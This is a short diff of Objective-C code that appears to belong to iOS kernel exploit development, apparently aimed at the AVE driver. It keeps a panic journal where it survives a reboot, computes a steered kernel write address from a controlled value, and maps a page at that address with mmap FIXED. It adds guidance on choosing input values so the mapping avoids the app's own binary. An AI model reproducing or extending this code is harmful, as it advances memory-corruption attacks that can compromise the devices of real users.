@@ -30,7 +30,9 @@
 }
 
 - (void)journal:(NSString *)line {
-    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"kp-ave-pan-journal.log"];
+    // Documents, not tmp: house_arrest AFC can pull it after a reboot.
+    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
+                      stringByAppendingPathComponent:@"kp-ave-pan-journal.log"];
     NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
     if (!fh) {
         [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
@@ -61,6 +63,14 @@
     uint64_t writeAddr = ((uint64_t)(uint32_t)k << 32) | 0x59ULL;
     uint64_t pageBase = writeAddr & ~0x3FFFULL; // 16 KB align
     [report appendFormat:@"steered write addr = 0x%llx  page base = 0x%llx\n", writeAddr, pageBase];
+
+    // The 0x1_00000000 range is where the APP BINARY lives — mmap FIXED there
+    // collides (errno=12). Only use addresses at/above 0x4_00000000 (K>=4).
+    if (pageBase < 0x400000000ULL) {
+        [report appendString:@"\nVERDICT: ADDRESS_COLLIDES_WITH_APP_TEXT\n"];
+        [report appendString:@"0x1xxxxxxxx is the app's own mapping; use NTL>=16467 (K>=4).\n"];
+        return report;
+    }
 
     // 1) map the page at the steered address
     void *page = mmap((void *)(uintptr_t)pageBase, 0x4000,
